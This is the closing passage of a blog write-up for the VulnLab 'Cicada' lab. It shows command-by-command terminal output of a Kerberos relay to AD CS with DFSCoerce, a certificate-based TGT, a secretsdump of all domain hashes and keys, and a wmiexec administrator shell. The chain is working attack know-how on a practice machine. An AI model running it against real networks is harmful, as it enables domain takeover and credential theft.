Requirement already satisfied: dnspython in ./venv/lib/python3.12/site-packages (from ldapdomaindump>=0.9.0->impacket) (2.7.0)  
Requirement already satisfied: future in ./venv/lib/python3.12/site-packages (from ldapdomaindump>=0.9.0->impacket) (1.0.0)  
Requirement already satisfied: cffi>=1.12 in ./venv/lib/python3.12/site-packages (from cryptography<43,>=41.0.5->pyOpenSSL==24.0.0->impacket) (1.17.1)  
Requirement already satisfied: MarkupSafe>=2.0 in ./venv/lib/python3.12/site-packages (from Jinja2>=3.1.2->flask>=1.0->impacket) (3.0.2)  
Requirement already satisfied: pycparser in ./venv/lib/python3.12/site-packages (from cffi>=1.12->cryptography<43,>=41.0.5->pyOpenSSL==24.0.0->impacket) (2.22)  
Using cached pyOpenSSL-24.0.0-py3-none-any.whl (58 kB)  
Using cached cryptography-42.0.8-cp39-abi3-manylinux_2_28_x86_64.whl (3.9 MB)  
Installing collected packages: cryptography, pyOpenSSL, impacket  
Attempting uninstall: cryptography  
Found existing installation: cryptography 38.0.4  
Uninstalling cryptography-38.0.4:  
Successfully uninstalled cryptography-38.0.4  
Attempting uninstall: pyOpenSSL  
Found existing installation: pyOpenSSL 22.1.0  
Uninstalling pyOpenSSL-22.1.0:  
Successfully uninstalled pyOpenSSL-22.1.0  
Successfully installed cryptography-42.0.8 impacket-0.12.0 pyOpenSSL-24.0.0  
  
┌──(venv)─(root㉿kali)-[/home/kali/VulnLab/cicada/krbrelayx]  
└─# python -c "import impacket; print('Impacket installed successfully')"  
  
Impacket installed successfully  
  
┌──(venv)─(root㉿kali)-[/home/kali/VulnLab/cicada/krbrelayx]  
└─# python krbrelayx.py -t 'http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC-JPQ225$'  
  
[*] Protocol Client HTTP loaded..  
[*] Protocol Client HTTPS loaded..  
[*] Protocol Client SMB loaded..  
[*] Protocol Client LDAPS loaded..  
[*] Protocol Client LDAP loaded..  
[*] Running in attack mode to single host  
[*] Running in kerberos relay mode because no credentials were specified.  
[*] Setting up SMB Server  
[*] Setting up HTTP Server on port 80  
[*] Setting up DNS Server  
  
[*] Servers started, waiting for connections  
[*] SMBD: Received connection from 10.10.99.217  
[*] HTTP server returned status code 200, treating as a successful login  
[*] SMBD: Received connection from 10.10.99.217  
[*] Generating CSR...  
[*] CSR generated!  
[*] Getting certificate...  
[*] HTTP server returned status code 200, treating as a successful login  
[*] Skipping user DC-JPQ225$ since attack was already performed  
[*] GOT CERTIFICATE! ID 22  
[*] Writing PKCS#12 certificate to ./DC-JPQ225$.pfx  
[*] Certificate successfully written to file                                                                                          
```

After setting up `krbrelayx`, it’s time to launch the attack to get the certificate. This step involves leveraging the Kerberos relay to steal the certificate from a vulnerable service. Here's how you can frame it:

Now that `krbrelayx` is all set, it’s time to take action and exploit the vulnerability. By relaying the Kerberos authentication, we can go after the certificate this is where the magic happens! The goal is to intercept the ticket and extract the certificate. The fun part is just about to begin, so let's get those creds!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/cicada/DFSCoerce]  
└─# KRB5CCNAME=Rosie.Powell@DC-QPQ225.ccache python3 dfscoerce.py -k -no-pass 'dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' dc-jpq225.cicada.vl  
[-] Connecting to ncacn_np:dc-jpq225.cicada.vl[\PIPE\netdfs]  
[+] Successfully bound!  
[-] Sending NetrDfsRemoveStdRoot!  
NetrDfsRemoveStdRoot  
ServerName: 'dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\x00'  
RootShare: 'test\x00'  
ApiFlags: 1
```

I’ll use the `gettgtpkinit.py` script from the PKINITtools to request the TGT, along with the certificate we obtained from `krbrelayx`

```bash
  
┌──(root㉿kali)-[/home/…/VulnLab/cicada/krbrelayx/PKINITtools]  
└─# ls  
'DC-JPQ225$.pfx' gets4uticket.py LICENSE README.md  
getnthash.py gettgtpkinit.py ntlmrelayx requirements.txt  
  
┌──(root㉿kali)-[/home/…/VulnLab/cicada/krbrelayx/PKINITtools]  
└─# ./gettgtpkinit.py -cert-pfx 'DC-JPQ225$.pfx' 'cicada.vl/DC-JPQ225$' DC-JPQ225.ccache  
2025-02-28 12:21:58,069 minikerberos INFO Loading certificate and key from file  
INFO:minikerberos:Loading certificate and key from file  
2025-02-28 12:21:58,593 minikerberos INFO Requesting TGT  
INFO:minikerberos:Requesting TGT  
2025-02-28 12:22:09,944 minikerberos INFO AS-REP encryption key (you might need this later):  
INFO:minikerberos:AS-REP encryption key (you might need this later):  
2025-02-28 12:22:09,944 minikerberos INFO 4c91a9c45fcfd49ada6ba94a90333275bd231927abd62249ac314ad31ebe5feb  
INFO:minikerberos:4c91a9c45fcfd49ada6ba94a90333275bd231927abd62249ac314ad31ebe5feb  
2025-02-28 12:22:09,948 minikerberos INFO Saved TGT to file  
INFO:minikerberos:Saved TGT to file  
  
┌──(root㉿kali)-[/home/…/VulnLab/cicada/krbrelayx/PKINITtools]  
└─# KRB5CCNAME=DC-JPQ225.ccache secretsdump.py -k -no-pass DC-JPQ225.cicada.vl  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user  
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
[*] Using the DRSUAPI method to get NTDS.DIT secrets  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a--------7:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d1----------0c089c0:::  
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dd165a43fcb66d6a0e2924bb67e040c:::  
cicada.vl\Shirley.West:1104:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::  
cicada.vl\Jordan.Francis:1105:aad3b435b51404eeaad3b435b51404ee:f5caf661b715c4e1435dfae92c2a65e3:::  
cicada.vl\Jane.Carter:1106:aad3b435b51404eeaad3b435b51404ee:7e133f348892d577014787cbc0206aba:::  
cicada.vl\Joyce.Andrews:1107:aad3b435b51404eeaad3b435b51404ee:584c796cd820a48be7d8498bc56b4237:::  
cicada.vl\Daniel.Marshall:1108:aad3b435b51404eeaad3b435b51404ee:8cdf5eeb0d101559fa4bf00923cdef81:::  
cicada.vl\Rosie.Powell:1109:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::  
cicada.vl\Megan.Simpson:1110:aad3b435b51404eeaad3b435b51404ee:6e63f30a8852d044debf94d73877076a:::  
cicada.vl\Katie.Ward:1111:aad3b435b51404eeaad3b435b51404ee:42f8890ec1d9b9c76a187eada81adf1e:::  
cicada.vl\Richard.Gibbons:1112:aad3b435b51404eeaad3b435b51404ee:d278a9baf249d01b9437f0374bf2e32e:::  
cicada.vl\Debra.Wright:1113:aad3b435b51404eeaad3b435b51404ee:d9a2147edbface1666532c9b3acafaf3:::  
DC-JPQ225$:1000:aad3b435b51404eeaad3b435b51404ee:4719052177830d3c865b1453ad46d1df:::  
[*] Kerberos keys grabbed  
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0b--------------  
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0b------  
Administrator:des-cbc-md5:fd2a29621f3e7604  
krbtgt:aes256-cts-hmac-sha1-96:ed5b82d607535668e59aa8deb651be5abb9f1da0d31fa81fd24f9890ac84693d  
krbtgt:aes128-cts-hmac-sha1-96:9b7825f024f21e22e198e4aed70ff8ea  
krbtgt:des-cbc-md5:2a768a9e2c983e31  
cicada.vl\Shirley.West:aes256-cts-hmac-sha1-96:3f3657fb6f0d441680e9c5e0c104ef4005fa5e79b01bbeed47031b04a913f353  
cicada.vl\Shirley.West:aes128-cts-hmac-sha1-96:cd16a8664de29a4e8bd9e8b492f3eef9  
cicada.vl\Shirley.West:des-cbc-md5:abbf341664bafe76  
cicada.vl\Jordan.Francis:aes256-cts-hmac-sha1-96:ec8aaa2c9432ed3b0d2834e4e24dc243ec8d77ec3488101e79d1b2cc1c2ee6ea  
cicada.vl\Jordan.Francis:aes128-cts-hmac-sha1-96:0b551142246edc108a92913e46852404  
cicada.vl\Jordan.Francis:des-cbc-md5:a2e53d6ea44ab6e9  
cicada.vl\Jane.Carter:aes256-cts-hmac-sha1-96:bb04095d1884439b825a5606dd43aadfd2a8fad1386b3728b9bad582efd5d4aa  
cicada.vl\Jane.Carter:aes128-cts-hmac-sha1-96:8a27618e7036a49fb6e371f2e7af649e  
cicada.vl\Jane.Carter:des-cbc-md5:340eda8962cbadce  
cicada.vl\Joyce.Andrews:aes256-cts-hmac-sha1-96:7ca8317638d429301dfbb88af701fadffbc106d31f79a4de7e8d35afbc2d30c4  
cicada.vl\Joyce.Andrews:aes128-cts-hmac-sha1-96:6ec2495dea28c09cf636dd8b080012fd  
cicada.vl\Joyce.Andrews:des-cbc-md5:6bf2b6f21fcda258  
cicada.vl\Daniel.Marshall:aes256-cts-hmac-sha1-96:fcccb590bac0a888898461247fbb3ee28d282671d8491e0b0b83ac688c2a29d6  
cicada.vl\Daniel.Marshall:aes128-cts-hmac-sha1-96:80a3b053500586eefd07d32fc03e3849  
cicada.vl\Daniel.Marshall:des-cbc-md5:e0fbdcb3c7e9f154  
cicada.vl\Rosie.Powell:aes256-cts-hmac-sha1-96:54de41137f8d37d4a6beac1638134dfefa73979041cae3ffc150ebcae470fce5  
cicada.vl\Rosie.Powell:aes128-cts-hmac-sha1-96:d01b3b63a2cde0d1c5e9e0e4a55529a4  
cicada.vl\Rosie.Powell:des-cbc-md5:6e70b9a41a677a94  
cicada.vl\Megan.Simpson:aes256-cts-hmac-sha1-96:cdb94aaf5b15465371cbe42913d652fa7e2a2e43afc8dd8a17fee1d3f142da3b  
cicada.vl\Megan.Simpson:aes128-cts-hmac-sha1-96:8fd3f86397ee83ed140a52bdfa321df0  
cicada.vl\Megan.Simpson:des-cbc-md5:587032806b5d19b6  
cicada.vl\Katie.Ward:aes256-cts-hmac-sha1-96:829effafe88a0a5e17c4ccf1840f277327309b2902aeccc36625ac51b8e936bc  
cicada.vl\Katie.Ward:aes128-cts-hmac-sha1-96:585264bc071354147db5b677be13506b  
cicada.vl\Katie.Ward:des-cbc-md5:01801aa2e5755898  
cicada.vl\Richard.Gibbons:aes256-cts-hmac-sha1-96:3c3beb85ec35003399e37ae578b90ae7a65b4ec7305e0ac012dbeaaa41bcbe22  
cicada.vl\Richard.Gibbons:aes128-cts-hmac-sha1-96:646557f4143182bda5618f95429f3a49  
cicada.vl\Richard.Gibbons:des-cbc-md5:834a675bd058efd0  
cicada.vl\Debra.Wright:aes256-cts-hmac-sha1-96:26409e8cc8f3240501db7319bd8d8a2077d6b955a8f673b9ccf7d9086d3aec62  
cicada.vl\Debra.Wright:aes128-cts-hmac-sha1-96:6a289ddd9a1a2196b671b4bbff975629  
cicada.vl\Debra.Wright:des-cbc-md5:f25eb6a4265413cb  
DC-JPQ225$:aes256-cts-hmac-sha1-96:89e3e7d3e1b01fb134096121857f18788d0e475846ded86fa6e6b6964b48b324  
DC-JPQ225$:aes128-cts-hmac-sha1-96:27214666377e085e35e8fc8f1805b19f  
DC-JPQ225$:des-cbc-md5:49b994910d4a3207  
[*] Cleaning up...
```

And here we go! With the administrator hash, I requested the TGT using the IHS hash and logged in via `wmiexec`. Hell yeah, the Cicada is now pwned!

```bash
┌──(root㉿kali)-[/home/…/VulnLab/cicada/krbrelayx/PKINITtools]  
└─# getTGT.py cicada.vl/Administrator -hashes :85a0da53871----- -dc-ip 10.10.99.217  
  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Saving ticket in Administrator.ccache  
  
┌──(root㉿kali)-[/home/…/VulnLab/cicada/krbrelayx/PKINITtools]  
└─# export KRB5CCNAME=Administrator.ccache  
  
┌──(root㉿kali)-[/home/…/VulnLab/cicada/krbrelayx/PKINITtools]  
└─# impacket-wmiexec cicada.vl/administrator@DC-JPQ225 -k -no-pass  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] SMBv3.0 dialect used  
[!] Launching semi-interactive shell - Careful what you execute  
[!] Press help for extra shell commands  
C:\>whoami  
cicada\administrator
```

![](https://cdn-images-1.medium.com/max/800/0*ghKDKCGSUM03zrql.gif)

*That’s the treasure I hunt for after pwning the machine, mate!*

---

### Do You Wanna Chat with Maverick?🥂

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box!](https://app.hackthebox.com/profile/1054724) i love chatting with like-minded people, sharing knowledge, and learning from everyone. Happy hacking! 🚀

![](https://cdn-images-1.medium.com/max/800/0*jLt99ygX5va6utFE.gif)

#### References

[https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx](https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx)

> 🔗 [https://docs-cortex.paloaltonetworks.com/r/Cortex-XSIAM/Cortex-XSIAM-Analytics-Alert-Reference-by-Alert-name/Possible-Kerberos-relay-attack](https://docs-cortex.paloaltonetworks.com/r/Cortex-XSIAM/Cortex-XSIAM-Analytics-Alert-Reference-by-Alert-name/Possible-Kerberos-relay-attack)

> 🔗 [https://www.elastic.co/guide/en/security/8.17/prebuilt-rule-8-1-1-potential-privilege-escalation-via-local-kerberos-relay-over-ldap.html](https://www.elastic.co/guide/en/security/8.17/prebuilt-rule-8-1-1-potential-privilege-escalation-via-local-kerberos-relay-over-ldap.html)

[https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/kerberos/kerberos-relay](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/kerberos/kerberos-relay)

By Mohamed Eletreby on February 28, 2025.

Canonical link

Exported from Medium on April 20, 2026.